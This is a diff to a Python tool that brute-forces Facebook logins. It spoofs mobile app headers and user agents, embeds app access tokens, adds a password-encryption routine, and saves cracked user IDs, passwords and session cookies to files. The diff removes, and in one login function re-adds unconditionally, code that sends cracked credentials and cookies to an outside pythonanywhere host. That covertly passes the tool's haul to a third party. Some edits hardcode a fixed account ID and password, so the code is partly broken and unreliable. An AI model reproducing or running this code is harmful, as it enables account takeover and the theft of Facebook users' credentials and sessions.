@@ -89,15 +89,13 @@ from datetime import datetime
 from time import sleep
 from time import sleep as waktu
 from requests.exceptions import ConnectionError as net_error
-import os
-import sys
-import re
+import base64
+import struct
 import time
-import json
-import uuid
-import string
-import random
 import requests
+from Crypto.Cipher import AES, PKCS1_v1_5
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
 from concurrent.futures import ThreadPoolExecutor as tpe
 from requests.exceptions import ConnectionError as ce
 try:
@@ -1270,6 +1268,66 @@ def graph(uid, name, pwx, tl):
         print(e)
         pass     
 
+# ==================== ENKRIPSI PASSWORD (TETAP ADA, TAPI TIDAK DIPANGGIL DI SMARTLOCK) ====================
+class FacebookAuth:
+    def __init__(self):
+        # Menggunakan session agar request ke API Facebook lebih cepat
+        self.session = requests.Session()
+
+    def PWD_FB4A(self, password: str, public_key: str = None, key_id: str = "25") -> str:
+        # 1. Ambil Public Key dari Facebook jika tidak disediakan
+        if not public_key:
+            try:
+                url = 'https://b-graph.facebook.com/pwd_key_fetch'
+                params = {
+                    'version': '2',
+                    'flow': 'CONTROLLER_INITIALIZATION',
+                    'method': 'GET',
+                    'fb_api_req_friendly_name': 'pwdKeyFetch',
+                    'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
+                    'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
+                }
+                response = self.session.get(url, params=params, timeout=10).json()
+                public_key = response.get('public_key')
+                key_id = str(response.get('key_id', key_id))
+            except Exception:
+                return "#PWD_FB4A:0:0:"
+
+        if not public_key:
+            return "#PWD_FB4A:0:0:"
+
+        # 2. Proses Enkripsi Gabungan (RSA + AES-GCM)
+        try:
+            current_time = int(time.time())
+            rand_key = get_random_bytes(32)
+            iv = get_random_bytes(12)
+
+            # Enkripsi Simetris (AES-GCM) untuk Password
+            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
+            cipher_aes.update(str(current_time).encode("utf-8"))
+            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
+
+            # Enkripsi Asimetris (RSA) untuk Mengunci rand_key
+            pubkey = RSA.import_key(public_key)
+            cipher_rsa = PKCS1_v1_5.new(pubkey)
+            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
+
+            # 3. Penyusunan Payload Biner (Lebih cepat tanpa BytesIO)
+            payload = (
+                bytes([1, int(key_id)]) +
+                iv +
+                struct.pack("<h", len(encrypted_rand_key)) +
+                encrypted_rand_key +
+                auth_tag +
+                encrypted_passwd
+            )
+
+            # 4. Encode ke Base64 dan Format Hasil Akhir
+            encoded = base64.b64encode(payload).decode("utf-8")
+            return f"#PWD_FB4A:2:{current_time}:{encoded}"
+
+        except Exception:
+            return "#PWD_FB4A:0:0:"
 def generate_machine_id():
     chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
     return ''.join(random.choices(chars, k=random.randint(20, 28)))
@@ -1282,6 +1340,22 @@ def generate_usdid():
     ts_part = int(time.time())
     sig = base64.b64encode(os.urandom(48)).decode().replace('=','').replace('+','_').replace('/','_')
     return f'{uid_part}.{ts_part}.{sig}'
+
+def anjay():
+    rr = random.randint
+    rc = random.choice
+    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+    fbrv = str(random.randint(0, 999999999))
+    density = random.choice(['2.0', '2.5', '3.0'])
+    width = random.choice(["720", "1080", "1280", "1440"])
+    height = random.choice(["720", "1080", "1280", "1440", "1920"])
+    fbbv = str(random.randint(332275123, 932275123))
+    kartu = random.choice(["Axieta","Telkomsel","HotRod","MTN-CG"])
+    vivo = random.choice(["V2022","V2023","V2028","V2024","V2025","V2026","V2029","V2030","V2031"])
+    xiaomi = random.choice(["23116PN5BC","22111317I","24053PY09I","2406ERN9CI","24048RN6CG","M2101K7BI","24115RA8EC","23028RNCAG","2312CRNCCL","23054RA19C","XIAOMI Redmi Note 9 Pro","Xiaomi Redmi Note 13","2207122MC"])
+    ua1 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/{kartu};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{xiaomi};FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]"
+    ua2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/{kartu};FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/{vivo};FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]"
+    return random.choice([ua1,ua2])
 
 def x1():
     END = "[FBAN/FB4A;F"+"BAV/"+"106"+".0.0.26.68;FBBV/"+"106;F"+"BDM/{"+"density="+"3.0,wid"+"th=750"+",height=1334};FBLC/it_"+"IT;FBRV/106."+"0.0.26.6"+"8;FBCR/Etisalat"+"Afg"+"hanistan;FBMF/Infi"+"nix_"+"Note_8i;FBBD/Infi"+"nix_Note_8i;FBPN/c"+"om.facebook.katana"+";FBDV/I"+"nfinix_Note_8i_10_0;FBSV/10.0;FBOP/1;FBCA/"+"x86:armeabi-v7a;]"
@@ -1335,7 +1409,7 @@ def mbasic(uid,pwx,tl):
             encode = urllib.parse.urlencode(data, doseq=True)
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://graph.facebook.com/graphql', data=encode)
-            if "session_key" in response.text and "uid" in response.text and "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
+            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                 if match:
@@ -1343,26 +1417,21 @@ def mbasic(uid,pwx,tl):
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                     c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{c_user}|{pw}|{cok}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                        print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                        oks.append(uid)
-                        return True 
+                    print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
+                    print("Cookies:", cok)
+                    open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
+                    oks.append(uid)
+                    return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
-                bkas.append(uid)
-                if len(bkas)% 2 == 0:
-                    statusok = (f"{uid}|{pw}")
-                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                else:
+            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE1-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE2-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             else:
@@ -1422,7 +1491,7 @@ def p(uid,pwx,tl):
             }
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://b-graph.facebook.com/graphql', data=data, allow_redirects=True)
-            if "session_key" in response.text and "uid" in response.text and "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
+            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                 if match:
@@ -1430,26 +1499,21 @@ def p(uid,pwx,tl):
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                     c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{c_user}|{pw}|{cok}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                        print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                        oks.append(uid)
-                        return True 
+                    print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
+                    print("Cookies:", cok)
+                    open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
+                    oks.append(uid)
+                    return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
-                bkas.append(uid)
-                if len(bkas)% 2 == 0:
-                    statusok = (f"{uid}|{pw}")
-                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                else:
+            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
-                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    open("/sdcard/ATOM-FILE1-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE2-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
                     break
             else:
@@ -1479,32 +1543,35 @@ def x(uid,pwx,tl):
             machine_id_val = generate_machine_id()
             usdid_val = generate_usdid()
             headers = {
-                'Host': 'b-graph.facebook.com',
-                'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
-                'Priority': 'u=0',
-                'X-Zero-Eh': '664c0faaac849cb891d0a261fbb72a12',
-                'User-Agent': x1(),
-                'X-Fb-Friendly-Name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
-                'X-Zero-F-Device-Id': zero_f_device_id_val,
-                'X-Graphql-Request-Purpose': 'fetch',
-                'X-Fb-Device-Group': '4025',
-                'X-Tigon-Is-Retry': 'False',
-                'X-Graphql-Client-Library': 'graphservice',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'X-Fb-Net-Hni': '51000',
-                'X-Fb-Sim-Hni': '51000',
-                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'X-Zero-State': 'unknown',
-                'X-Meta-Zca': 'empty_token',
-                'App-Scope-Id-Header': app_scope_id_val,
-                'X-Fb-Connection-Type': 'WIFI',
-                'X-Meta-Usdid': usdid_val,
-                'X-Fb-Http-Engine': 'Tigon/Liger',
-                'X-Fb-Client-Ip': 'True',
-                'X-Fb-Server-Cluster': 'True',
-                'X-Fb-Conn-Uuid-Client': generate_conn_uuid(),
-            }
-            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
+            'host': 'b-graph.facebook.com',
+            'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
+            'x-fb-rmd': 'fail=Server:INVALID_MAP,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=0;recvTime=0',
+            'priority': 'u=0',
+            'content-encoding': 'gzip',
+            'x-fb-device-group': '7637',
+            'x-fb-integrity-machine-id': 'ujvAaf4BjiKVSe-fT2dB2Q1v',
+            'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
+            'user-agent': '[FBAN/FB4A;FBAV/565.0.0.49.74;FBBV/992346742;FBDM/{density=2.4,width=1080,height=2149};FBLC/id_ID;FBRV/0;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
+            'x-graphql-request-purpose': 'fetch',
+            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+            'x-zero-f-device-id': '6fb84474-8dec-4d1c-a5fe-70fe4c2decea',
+            'x-tigon-is-retry': 'False',
+            'x-zero-state': 'unknown',
+            'x-graphql-client-library': 'graphservice',
+            'x-fb-sim-hni': '51011',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-net-hni': '51011',
+            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'x-meta-zca': 'empty_token',
+            'app-scope-id-header': '875d726a-4b32-4331-b608-ab5b97b3bad3',
+            'x-fb-connection-type': 'MOBILE.LTE',
+            'x-meta-usdid': 'a4583fcf-b72d-4b0b-9e81-ad7585aae1df.1781776638.MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEj0ZQ2oEod4otgauhZssgmJu0OL7Vx4AbpFOKRLLxE8CJlz5HGmGfcthw57bSZPA0aXTYFoNRVEmu79ZQFIi2Xg.MEUCIHuzWAsHXA2MLZFbzAHcCk6XYLVoflGW5PMGH74AiJAMAiEAyxttg3ewvRSvDizZetmDBgmctPgva1n18S33Ti9sqNA',
+            # 'accept-encoding': 'gzip, deflate',
+            'x-fb-http-engine': 'Tigon/Liger',
+            'x-fb-client-ip': 'True',
+            'x-fb-server-cluster': 'True',
+            'x-fb-conn-uuid-client': '+KICAyif8dofWZ3R9QuCKw==',}
+            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), '938259')
             params = {
                 "method": "post",
                 "pretty": "false",
@@ -1538,7 +1605,7 @@ def x(uid,pwx,tl):
                                     "event_flow": "login_manual",
                                     "event_step": "home_page",
                                     "is_from_logged_in_switcher": False,
-                                    "contact_point": uid,
+                                    "contact_point": '100048966394519|',
                                 }
                             })
                         }),
@@ -1566,7 +1633,7 @@ def x(uid,pwx,tl):
                 "client_trace_id": str(uuid.uuid4()),
             }
             response = Session.post('https://b-graph.facebook.com/graphql', headers=headers, params=params)
-            if "session_key" in response.text and "uid" in response.text and "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
+            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                 if match:
@@ -1574,19 +1641,13 @@ def x(uid,pwx,tl):
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                     c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{c_user}|{pw}|{cok}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                        print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                        oks.append(uid)
-                        return True 
+                    statusok = (f"{c_user}|{pw}|{cok}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    okss.append(uid)
+                    return True 
                 else:
                    continue
-            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
                     statusok = (f"{uid}|{pw}")
@@ -1605,168 +1666,6 @@ def x(uid,pwx,tl):
         #print({error})
         pass
 
-def _generate_ua_apui():
-    chrome_ver  = random.randint(120, 149)
-    firefox_ver = random.randint(118, 136)
-    edge_ver    = random.randint(120, 148)
-    patch_ver   = random.randint(6000, 8500)
-    sub_ver     = random.randint(100, 300)
-
-    android_devices = [
-        ('13',  'Pixel 7',          'BP1A.240505.004'),
-        ('13',  'Pixel 7 Pro',      'TQ3A.230901.001'),
-        ('14',  'Pixel 8',          'AD1A.240905.004'),
-        ('14',  'Pixel 8 Pro',      'UQ1A.231205.015'),
-        ('15',  'Pixel 9',          'AP3A.241205.013'),
-        ('13',  'SM-S918B',         'TP1A.220624.014'),
-        ('13',  'SM-A546B',         'TP1A.220624.014'),
-        ('12',  'SM-G991B',         'SP1A.210812.016'),
-        ('14',  'CPH2447',          'UP1A.231005.007'),
-        ('13',  'M2102J20SG',       'TP1A.220624.014'),
-        ('14',  'V2309A',           'UP1A.231005.007'),
-    ]
-
-    windows_versions = ['10.0', '11.0']
-    mac_versions     = ['10_15_7', '11_0_0', '12_0_0', '13_0_0', '14_0_0']
-
-    ua_type = random.choice([
-        'chrome_android',
-        'chrome_android',
-        'chrome_android',
-        'chrome_windows',
-        'chrome_mac',
-        'edge_windows',
-        'firefox_android',
-        'firefox_windows',
-    ])
-
-    if ua_type == 'chrome_android':
-        av, dev, build = random.choice(android_devices)
-        ua = (
-            f'Mozilla/5.0 (Linux; Android {av}; {dev} Build/{build}) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) '
-            f'Chrome/{chrome_ver}.0.0.0 Mobile Safari/537.36'
-        )
-        sec_ch_ua = (
-            f'"Chromium";v="{chrome_ver}", '
-            f'"Google Chrome";v="{chrome_ver}", '
-            f'"Not-A.Brand";v="24"'
-        )
-        sec_ch_ua_full_version_list = (
-            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Not-A.Brand";v="24.0.0.0"'
-        )
-        sec_ch_ua_mobile           = '?1'
-        sec_ch_ua_model            = f'"{dev}"'
-        sec_ch_ua_platform         = '"Android"'
-        sec_ch_ua_platform_version = f'"{av}.0.0"'
-
-    elif ua_type == 'chrome_windows':
-        wv = random.choice(windows_versions)
-        ua = (
-            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) '
-            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36'
-        )
-        sec_ch_ua = (
-            f'"Chromium";v="{chrome_ver}", '
-            f'"Google Chrome";v="{chrome_ver}", '
-            f'"Not-A.Brand";v="24"'
-        )
-        sec_ch_ua_full_version_list = (
-            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Not-A.Brand";v="24.0.0.0"'
-        )
-        sec_ch_ua_mobile           = '?0'
-        sec_ch_ua_model            = '""'
-        sec_ch_ua_platform         = '"Windows"'
-        sec_ch_ua_platform_version = f'"{wv}.0"'
-
-    elif ua_type == 'chrome_mac':
-        mv = random.choice(mac_versions)
-        mv_dot = mv.replace('_', '.')
-        ua = (
-            f'Mozilla/5.0 (Macintosh; Intel Mac OS X {mv}) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) '
-            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36'
-        )
-        sec_ch_ua = (
-            f'"Chromium";v="{chrome_ver}", '
-            f'"Google Chrome";v="{chrome_ver}", '
-            f'"Not-A.Brand";v="24"'
-        )
-        sec_ch_ua_full_version_list = (
-            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Not-A.Brand";v="24.0.0.0"'
-        )
-        sec_ch_ua_mobile           = '?0'
-        sec_ch_ua_model            = '""'
-        sec_ch_ua_platform         = '"macOS"'
-        sec_ch_ua_platform_version = f'"{mv_dot}"'
-
-    elif ua_type == 'edge_windows':
-        wv = random.choice(windows_versions)
-        ua = (
-            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) '
-            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36 '
-            f'Edg/{edge_ver}.0.0.0'
-        )
-        sec_ch_ua = (
-            f'"Chromium";v="{chrome_ver}", '
-            f'"Microsoft Edge";v="{edge_ver}", '
-            f'"Not-A.Brand";v="24"'
-        )
-        sec_ch_ua_full_version_list = (
-            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Microsoft Edge";v="{edge_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Not-A.Brand";v="24.0.0.0"'
-        )
-        sec_ch_ua_mobile           = '?0'
-        sec_ch_ua_model            = '""'
-        sec_ch_ua_platform         = '"Windows"'
-        sec_ch_ua_platform_version = f'"{wv}.0"'
-
-    elif ua_type == 'firefox_android':
-        av, dev, build = random.choice(android_devices)
-        ua = (
-            f'Mozilla/5.0 (Android {av}; Mobile; rv:{firefox_ver}.0) '
-            f'Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0'
-        )
-        sec_ch_ua                  = ''
-        sec_ch_ua_full_version_list = ''
-        sec_ch_ua_mobile           = '?1'
-        sec_ch_ua_model            = f'"{dev}"'
-        sec_ch_ua_platform         = '"Android"'
-        sec_ch_ua_platform_version = f'"{av}.0.0"'
-
-    else:  # firefox_windows
-        wv = random.choice(windows_versions)
-        ua = (
-            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64; rv:{firefox_ver}.0) '
-            f'Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0'
-        )
-        sec_ch_ua                  = ''
-        sec_ch_ua_full_version_list = ''
-        sec_ch_ua_mobile           = '?0'
-        sec_ch_ua_model            = '""'
-        sec_ch_ua_platform         = '"Windows"'
-        sec_ch_ua_platform_version = f'"{wv}.0"'
-
-    return {
-        'ua':                          ua,
-        'sec_ch_ua':                   sec_ch_ua,
-        'sec_ch_ua_full_version_list': sec_ch_ua_full_version_list,
-        'sec_ch_ua_mobile':            sec_ch_ua_mobile,
-        'sec_ch_ua_model':             sec_ch_ua_model,
-        'sec_ch_ua_platform':          sec_ch_ua_platform,
-        'sec_ch_ua_platform_version':  sec_ch_ua_platform_version,
-    }
-
-
 def mobile(uid,pwx,tl):
     global oks
     global cps
@@ -1778,83 +1677,48 @@ def mobile(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            _ua_d  = _generate_ua_apui()
-            _agent = _ua_d['ua']
-            _sch_ua     = _ua_d['sec_ch_ua']
-            _sch_full   = _ua_d['sec_ch_ua_full_version_list']
-            _sch_mob    = _ua_d['sec_ch_ua_mobile']
-            _sch_mod    = _ua_d['sec_ch_ua_model']
-            _sch_plat   = _ua_d['sec_ch_ua_platform']
-            _sch_platv  = _ua_d['sec_ch_ua_platform_version']
             url = 'https://m.beta.facebook.com/login/'
-            headi = {
-                'Host': 'm.beta.facebook.com',
-                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Upgrade-Insecure-Requests': '1',
-                'User-Agent': _agent,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-User': '?1',
-                'Sec-Fetch-Dest': 'document',
-                'Priority': 'u=0, i',
-            }
-            headi['Sec-Ch-Ua']                   = _sch_ua
-            headi['Sec-Ch-Ua-Full-Version-List'] = _sch_full
-            headi['Sec-Ch-Ua-Mobile']            = _sch_mob
-            headi['Sec-Ch-Ua-Model']             = _sch_mod
-            headi['Sec-Ch-Ua-Platform']          = _sch_plat
-            headi['Sec-Ch-Ua-Platform-Version']  = _sch_platv
+            headi = {"authority": "m.prod.facebook.com",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "dpr": "3",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "none",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": anjay(),
+            "viewport-width": "980"}
             q  = Session.get(url, headers=headi)
             rt = q.text
-            hsku = ''
-            _m = re.search(r'"haste_session"\s*:\s*"([^"]+)"', rt)
-            if _m: hsku = _m.group(1)
-            ccgku = ''
-            _m = re.search(r'"connectionClass"\s*:\s*"([^"]+)"', rt)
-            if _m: ccgku = _m.group(1)
-            revku = ''
-            _m = re.search(r'consistency[^}]*rev:(\d+)', rt)
-            if not _m: _m = re.search(r'"rev"\s*:\s*(\d+)', rt)
-            if not _m: _m = re.search(r'\brev:(\d+)', rt)
-            if _m: revku = _m.group(1)
-            hsiku = ''
-            _m = re.search(r'"hsi"\s*:\s*"([^"]+)"', rt)
-            if _m: hsiku = _m.group(1)
-            dtsg = ''
-            _m = re.search(r'"dtsg"\s*:\s*\{\s*"token"\s*:\s*"([^"]+)"', rt)
-            if not _m: _m = re.search(r'"token"\s*:\s*"([A-Za-z0-9_\-]+:[0-9]+:[0-9]+)"', rt)
-            if _m: dtsg = _m.group(1)
-            jazoest = ''
-            _m = re.search(r"""name=["']jazoest["']\s+value=["']([^"']+)["']""", rt)
-            if not _m: _m = re.search(r"""<input[^>]+name=["']jazoest["'][^>]+value=["']([^"']+)["']""", rt)
-            if _m: jazoest = _m.group(1)
-            lsd = ''
-            _m = re.search(r"""name=["']lsd["']\s+value=["']([^"']+)["']""", rt)
-            if not _m: _m = re.search(r"""<input[^>]+name=["']lsd["'][^>]+value=["']([^"']+)["']""", rt)
-            if not _m: _m = re.search(r'"lsd"\s*:\s*"([^"]+)"', rt)
-            if _m: lsd = _m.group(1)
-            headers = {
-                'accept': '*/*',
-                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-                'cache-control': 'no-cache',
-                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                'origin': 'https://m.beta.facebook.com',
-                'pragma': 'no-cache',
-                'priority': 'u=1, i',
-                'referer': 'https://m.beta.facebook.com/login/',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': _sch_ua,
-                'sec-ch-ua-full-version-list': _sch_full,
-                'sec-ch-ua-mobile': _sch_mob,
-                'sec-ch-ua-model': _sch_mod,
-                'sec-ch-ua-platform': _sch_plat,
-                'sec-ch-ua-platform-version': _sch_platv,
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': _agent,
-            }
+            headers = {"authority": "www.facebook.com",
+            "method": "POST",
+            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
+            "scheme": "https",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "content-type": "application/x-www-form-urlencoded",
+            "dpr": "3",
+            "origin": "https://www.facebook.com",
+            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-model": "\"\"",
+            "sec-ch-ua-platform": "\"Linux\"",
+            "sec-ch-ua-platform-version": "\"\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+           "sec-fetch-site": "same-origin",
+           "sec-fetch-user": "?1",
+           "upgrade-insecure-requests": "1",
+           "user-agent": anjay(),
+           "viewport-width": "980"}
             params = {
                 'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
                 'type': 'action',
@@ -1866,16 +1730,16 @@ def mobile(uid,pwx,tl):
                 '__user': '0',
                 '__a': '1',
                 '__req': 'k',
-                '__hs': hsku,
+                '__hs': re.search(r'"haste_session"\s*:\s*"([^"]+)"', rt).group(1),
                 'dpr': '3',
-                '__ccg': ccgku,
-                '__rev': revku,
